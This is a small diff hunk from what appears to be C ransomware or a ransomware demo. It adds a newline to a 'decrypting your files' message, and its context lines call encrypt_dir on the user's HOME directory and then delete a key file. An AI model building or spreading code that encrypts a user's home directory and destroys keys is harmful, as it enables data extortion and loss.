@@ -70,7 +70,7 @@ int main(int argc, char* argv[])
         }
     }
 
-    printf("\nOk, decrypting your files");
+    printf("\nOk, decrypting your files\n");
     encrypt_dir(getenv("HOME"));
     sprintf(buf, "%s/%s", getenv("HOME"), KEY_NAME);
     remove(buf);
